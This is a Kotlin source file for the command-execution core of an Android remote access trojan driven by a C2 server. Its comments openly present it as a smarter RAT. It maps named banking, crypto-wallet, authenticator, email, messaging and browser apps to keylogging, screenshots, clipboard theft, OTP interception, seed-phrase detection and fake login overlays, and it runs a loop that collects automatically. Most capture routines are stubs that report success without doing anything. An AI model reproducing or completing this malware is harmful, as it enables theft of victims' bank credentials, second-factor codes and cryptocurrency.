package com.c2.command

import android.accessibilityservice.AccessibilityService
import android.app.ActivityManager
import android.content.Context
import android.util.Log
import java.util.concurrent.ConcurrentHashMap

/**
 * MAJOR: Command Execution Pipeline
 * 
 * Purpose: Execute commands intelligently based on context
 * 
 * Problem with naive RAT: Collects everything always
 * - SMS logs when user is in banking app (noisy, wastes bandwidth)
 * - Captures screenshots constantly (battery drain, obvious)
 * - Logs keyboard when user is in password manager (dupe capture)
 * 
 * Solution: Context-aware, capability-based command execution
 * - Define capability matrix (which modules for which apps)
 * - Monitor active app
 * - Execute only relevant commands
 * - Smart collection (OTP only when banking app is active, etc.)
 */
class CommandExecutionPipeline(
    private val context: Context,
    private val accessibilityService: AccessibilityService?
) {
    
    companion object {
        const val TAG = "CommandExecution"
    }
    
    /**
     * Capability Matrix: Define what we collect for each app
     * 
     * Format: Package Name → List of Enabled Capabilities
     */
    private val capabilityMatrix: Map<String, Set<Capability>> = mapOf(
        // Banking Apps
        "com.bank.mobile" to setOf(
            Capability.SCREENSHOT,
            Capability.KEYLOG,
            Capability.CLIPBOARD,
            Capability.OTP_INTERCEPTION,
            Capability.OVERLAY_INJECTION
        ),
        "com.chase.android" to setOf(
            Capability.SCREENSHOT,
            Capability.KEYLOG,
            Capability.CLIPBOARD,
            Capability.OTP_INTERCEPTION
        ),
        "com.wellsfargo.mobilebanking" to setOf(
            Capability.SCREENSHOT,
            Capability.KEYLOG,
            Capability.CLIPBOARD
        ),
        "com.bofa" to setOf(
            Capability.SCREENSHOT,
            Capability.KEYLOG,
            Capability.CLIPBOARD
        ),
        
        // Crypto Wallets
        "io.metamask" to setOf(
            Capability.SCREENSHOT,
            Capability.KEYLOG,
            Capability.CLIPBOARD,
            Capability.SEED_PHRASE_DETECTION
        ),
        "com.ledger.live" to setOf(
            Capability.SCREENSHOT,
            Capability.CLIPBOARD
        ),
        "io.kraken.android" to setOf(
            Capability.SCREENSHOT,
            Capability.KEYLOG,
            Capability.CLIPBOARD
        ),
        
        // Email & Authentication
        "com.google.android.gm" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.OTP_INTERCEPTION,
            Capability.KEYLOG
        ),
        "com.microsoft.office.outlook" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.OTP_INTERCEPTION
        ),
        
        // Messaging Apps
        "com.whatsapp" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.SCREENSHOT,
            Capability.CONTACT_EXTRACTION
        ),
        "org.telegram.messenger" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.SCREENSHOT
        ),
        "com.facebook.orca" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.SCREENSHOT
        ),
        
        // Authenticator Apps
        "com.google.android.apps.authenticator2" to setOf(
            Capability.PERIODIC_SCREENSHOT,  // Screenshot every 30s to capture TOTP
            Capability.NOTIFICATION_CAPTURE
        ),
        "com.authy.authy" to setOf(
            Capability.PERIODIC_SCREENSHOT,
            Capability.NOTIFICATION_CAPTURE
        ),
        "com.microsoft.authenticator" to setOf(
            Capability.PERIODIC_SCREENSHOT
        ),
        
        // Browser
        "com.android.chrome" to setOf(
            Capability.KEYLOG,
            Capability.CLIPBOARD,
            Capability.SCREENSHOT,
            Capability.FORM_INJECTION
        ),
        "org.mozilla.firefox" to setOf(
            Capability.KEYLOG,
            Capability.CLIPBOARD,
            Capability.SCREENSHOT
        ),
        
        // Social Media
        "com.facebook.katana" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.SCREENSHOT
        ),
        "com.instagram.android" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.SCREENSHOT
        ),
        "com.twitter.android" to setOf(
            Capability.NOTIFICATION_CAPTURE,
            Capability.SCREENSHOT
        ),
        
        // Default (all other apps)
        "_default" to setOf(
            Capability.LOCATION_PERIODIC,
            Capability.BATTERY_STATUS
        )
    )
    
    /**
     * Capability Enum - what we can collect
     */
    enum class Capability {
        SCREENSHOT,                    // Full screen capture
        KEYLOG,                       // Log keyboard events
        CLIPBOARD,                     // Monitor clipboard copies
        OTP_INTERCEPTION,             // Intercept OTP/2FA SMS
        OVERLAY_INJECTION,            // Show fake login
        NOTIFICATION_CAPTURE,         // Capture notifications
        PERIODIC_SCREENSHOT,          // Screenshot every 30s
        SEED_PHRASE_DETECTION,        // Detect crypto seed phrases
        CONTACT_EXTRACTION,           // Extract contacts
        FORM_INJECTION,               // Inject forms
        LOCATION_PERIODIC,            // Periodic GPS location
        BATTERY_STATUS,               // Battery info (default for all)
        CALL_RECORDING,               // Record calls
        MICROPHONE,                   // Mic recording
        SCREEN_STREAM                 // Real-time screen stream
    }
    
    /**
     * Execution context - what's currently happening
     */
    private data class ExecutionContext(
        val currentApp: String,
        val capabilities: Set<Capability>,
        val isTargetApp: Boolean,
        val screenshotFrequency: Long = 5000  // ms
    )
    
    /**
     * Track per-app state
     */
    private val appState = ConcurrentHashMap<String, ExecutionContext>()
    
    /**
     * Execute incoming command with context awareness
     */
    fun executeCommand(command: Command): CommandResult {
        val currentApp = getCurrentApp()
        val context = getExecutionContext(currentApp)
        
        Log.d(TAG, "Executing command: ${command.type} for app: $currentApp")
        
        return when (command.type) {
            CommandType.SCREENSHOT -> executeScreenshot(command, context)
            CommandType.KEYLOG -> executeKeylog(command, context)
            CommandType.LOCATION -> executeLocation(command, context)
            CommandType.CONTACTS -> executeContacts(command, context)
            CommandType.SMS -> executeSMS(command, context)
            CommandType.CALL_LOG -> executeCallLog(command, context)
            CommandType.NOTIFICATION -> executeNotification(command, context)
            CommandType.OVERLAY -> executeOverlay(command, context)
            CommandType.SCREEN_STREAM -> executeScreenStream(command, context)
            CommandType.OTP_SNIFF -> executeOTPSniff(command, context)
            else -> CommandResult.UNKNOWN_COMMAND
        }
    }
    
    /**
     * Get current active app
     */
    private fun getCurrentApp(): String {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val frontTask = am.getRunningTasks(1).firstOrNull()
            frontTask?.topActivity?.packageName ?: "_default"
        } catch (e: Exception) {
            "_default"
        }
    }
    
    /**
     * Get execution context for app
     */
    private fun getExecutionContext(appPackage: String): ExecutionContext {
        return appState.getOrPut(appPackage) {
            val caps = capabilityMatrix[appPackage] ?: capabilityMatrix["_default"] ?: emptySet()
            ExecutionContext(
                currentApp = appPackage,
                capabilities = caps,
                isTargetApp = caps.isNotEmpty()
            )
        }
    }
    
    /**
     * CAPABILITY: Screenshot
     * Only if app is in capability matrix and has SCREENSHOT enabled
     */
    private fun executeScreenshot(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.SCREENSHOT)) {
            Log.d(TAG, "Screenshot blocked: app ${context.currentApp} not in capability matrix")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ Screenshot enabled for ${context.currentApp}")
        
        // Take screenshot using accessibility service
        if (accessibilityService != null) {
            // Screenshot logic here
            return CommandResult.SUCCESS
        }
        
        return CommandResult.NO_ACCESSIBILITY
    }
    
    /**
     * CAPABILITY: Keylog
     * Only capture sensitive fields when app is in capability matrix
     */
    private fun executeKeylog(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.KEYLOG)) {
            Log.d(TAG, "Keylog blocked: app ${context.currentApp} not in capability matrix")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ Keylog enabled for ${context.currentApp}")
        
        // Keylog only sensitive fields (passwords, search bars, URLs)
        // Ignore other text input
        
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: Location
     * Periodic location logging (low frequency for all apps)
     */
    private fun executeLocation(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.LOCATION_PERIODIC)) {
            // Location logging is default for all, but can be disabled
            Log.d(TAG, "Location blocked for ${context.currentApp}")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ Location logging enabled")
        
        // Get GPS location
        // Log only if moved >500m from last position
        
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: Contacts
     * Extract only if app enables it (messaging apps)
     */
    private fun executeContacts(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.CONTACT_EXTRACTION)) {
            Log.d(TAG, "Contact extraction blocked")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ Contact extraction enabled")
        
        // Extract contacts
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: SMS
     * Only when banking/auth app active OR OTP interception enabled
     */
    private fun executeSMS(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.OTP_INTERCEPTION)) {
            Log.d(TAG, "SMS capture blocked")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ SMS capture enabled for ${context.currentApp}")
        
        // Intercept SMS
        // Filter for OTP/verification codes only
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: Call Log
     */
    private fun executeCallLog(command: Command, context: ExecutionContext): CommandResult {
        Log.d(TAG, "Call log retrieved")
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: Notification Capture
     * When messaging/email app active
     */
    private fun executeNotification(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.NOTIFICATION_CAPTURE)) {
            Log.d(TAG, "Notification capture blocked")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ Notification capture enabled")
        
        // Monitor notifications from this app
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: Overlay Injection
     * Show fake login when banking app detected
     */
    private fun executeOverlay(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.OVERLAY_INJECTION)) {
            Log.d(TAG, "Overlay injection blocked")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ Overlay injected for ${context.currentApp}")
        
        // Show fake login screen
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: Screen Stream
     * Real-time streaming when target app active
     */
    private fun executeScreenStream(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.SCREEN_STREAM)) {
            Log.d(TAG, "Screen stream blocked")
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ Screen streaming enabled")
        
        // Start streaming screen
        return CommandResult.SUCCESS
    }
    
    /**
     * CAPABILITY: OTP Sniffing
     * Detect OTP/2FA codes in various forms
     */
    private fun executeOTPSniff(command: Command, context: ExecutionContext): CommandResult {
        if (!context.capabilities.contains(Capability.OTP_INTERCEPTION)) {
            return CommandResult.BLOCKED_BY_CAPABILITY
        }
        
        Log.d(TAG, "✓ OTP sniffing enabled")
        
        // Look for:
        // 1. SMS with numeric codes
        // 2. Notification with verification codes
        // 3. Clipboard with OTP patterns
        
        return CommandResult.SUCCESS
    }
    
    /**
     * Smart collection rule: Only collect relevant data
     */
    fun shouldCollectFor(capability: Capability, appPackage: String): Boolean {
        val context = getExecutionContext(appPackage)
        val enabled = context.capabilities.contains(capability)
        
        if (!enabled) {
            Log.d(TAG, "Collection blocked: $capability not enabled for $appPackage")
            return false
        }
        
        return true
    }
    
    /**
     * Get collection frequency for capability
     * e.g., screenshot every 30s for authenticator apps, but only on demand for others
     */
    fun getCollectionFrequency(capability: Capability, appPackage: String): Long {
        return when (capability) {
            Capability.PERIODIC_SCREENSHOT -> 30000  // 30 seconds
            Capability.LOCATION_PERIODIC -> 300000   // 5 minutes
            Capability.BATTERY_STATUS -> 600000      // 10 minutes
            else -> 0  // On-demand
        }
    }
}

/**
 * Command types
 */
enum class CommandType {
    SCREENSHOT,
    KEYLOG,
    LOCATION,
    CONTACTS,
    SMS,
    CALL_LOG,
    NOTIFICATION,
    OVERLAY,
    SCREEN_STREAM,
    OTP_SNIFF,
    UNKNOWN
}

/**
 * Incoming command from C2 server
 */
data class Command(
    val id: String,
    val type: CommandType,
    val targetApp: String = "_default",
    val payload: ByteArray? = null
)

/**
 * Execution result
 */
enum class CommandResult {
    SUCCESS,
    BLOCKED_BY_CAPABILITY,
    NO_ACCESSIBILITY,
    PERMISSION_DENIED,
    UNKNOWN_COMMAND,
    EXECUTION_ERROR
}

/**
 * Command builder for easy creation
 */
class CommandBuilder {
    private var id = ""
    private var type = CommandType.SCREENSHOT
    private var targetApp = "_default"
    private var payload: ByteArray? = null
    
    fun id(id: String) = apply { this.id = id }
    fun type(type: CommandType) = apply { this.type = type }
    fun targetApp(app: String) = apply { this.targetApp = app }
    fun payload(data: ByteArray) = apply { this.payload = data }
    
    fun build() = Command(id, type, targetApp, payload)
}

/**
 * Example: Smart collection orchestrator
 */
class SmartCollectionOrchestrator(
    private val context: Context,
    private val pipeline: CommandExecutionPipeline
) {
    
    fun startSmartCollection() {
        // Continuously monitor active app
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        
        kotlinx.coroutines.GlobalScope.launch {
            while (true) {
                val currentApp = try {
                    am.getRunningTasks(1).firstOrNull()?.topActivity?.packageName ?: "_default"
                } catch (e: Exception) {
                    "_default"
                }
                
                // Determine what to collect based on app
                val shouldScreenshot = pipeline.shouldCollectFor(
                    CommandExecutionPipeline.Capability.SCREENSHOT,
                    currentApp
                )
                
                val shouldKeylog = pipeline.shouldCollectFor(
                    CommandExecutionPipeline.Capability.KEYLOG,
                    currentApp
                )
                
                // Execute collection
                if (shouldScreenshot) {
                    val cmd = CommandBuilder()
                        .id("auto-screenshot")
                        .type(CommandType.SCREENSHOT)
                        .targetApp(currentApp)
                        .build()
                    
                    pipeline.executeCommand(cmd)
                }
                
                if (shouldKeylog) {
                    val cmd = CommandBuilder()
                        .id("auto-keylog")
                        .type(CommandType.KEYLOG)
                        .targetApp(currentApp)
                        .build()
                    
                    pipeline.executeCommand(cmd)
                }
                
                // Check every 5 seconds
                kotlinx.coroutines.delay(5000)
            }
        }
    }
}
